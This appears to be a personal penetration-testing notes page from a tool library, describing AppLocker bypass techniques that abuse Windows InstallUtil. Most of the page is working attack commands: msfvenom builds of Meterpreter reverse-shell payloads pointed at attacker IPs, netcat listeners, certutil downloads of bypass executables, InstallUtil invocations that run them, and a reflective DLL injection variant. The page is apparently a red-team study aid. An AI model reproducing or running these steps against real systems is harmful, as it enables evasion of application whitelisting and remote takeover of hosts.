# InstallUtil

## GitHub Tool Library Reference

The following is a collection of various AppLocker bypass tools

Main Directory: ToolLibrary/AppLocker-CLM/InstallUtil

***

## AppLocker-Bypass&#x20;

will run a runner.ps1 which will be tied to a powershell code runner.&#x20;

### Requirements

The following powershell code runner is required and hosted on kali webserver (python http.server) and renamed to `runner.ps1`

* Reference: ToolLibrary/CodeRunners/powershellCodeRunner-32.ps1\
  Reference: ToolLibrary/CodeRunners/powershellCodeRunner-64.ps1



{% code overflow="wrap" %}
```bash
# payload for the powershellCodeRunner 32-bit
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8080 EXITFUNC=thread -f ps1

# payload for the powershellCodeRunner 64-bit
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8080 EXITFUNC=thread -f ps1
```
{% endcode %}

### Execution Steps

{% code overflow="wrap" %}
```bash
# setup netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080

# Download file via certutil -urlcache -f http://ip/CLMBypass-shell.exe shell.exe
PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```
{% endcode %}

### Compiled Payload Location

\home\kali\ToolLibrary\Compiled\AppLocker\AppLocker-Bypass.exe

***

## AppLocker-Bypass-Shell

will run a reverse shell and require netcat listener on designated IP address and Port

### Execution Steps

{% code overflow="wrap" %}
```bash
# setup netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080

# Download file via certutil -urlcache -f http://ip/CLMBypass-shell.exe shell.exe
PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```
{% endcode %}

### Compiled Payload Location

\home\kali\ToolLibrary\Compiled\AppLocker\AppLocker-Bypass-shell.exe

***

## AppLocker-Bypass-DLL

### Requirements:

Invoke-ReflectivePEInjection.ps1 file hosted on attacker webserver (default port 80)

* ToolLibrary/AppLocker-CLM/AppLocker-Bypass-DLL/Invoke-ReflectivePEInjection.ps1

### Execution Steps

{% code overflow="wrap" %}
```bash
# setup netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080

# Create the meterpreter DLL (met.dll) and host it in http web directory
┌──(kali㉿kali)-[~/httpDirectory]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8080 EXITFUNC=thread -f dll > met.dll

# Download file via certutil -urlcache -f http://ip/CLMBypass-dll.exe dll.exe
PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U dll.exe
```
{% endcode %}

### Compiled Payload Location

\home\kali\ToolLibrary\Compiled\AppLocker\AppLocker-Bypass-DLL
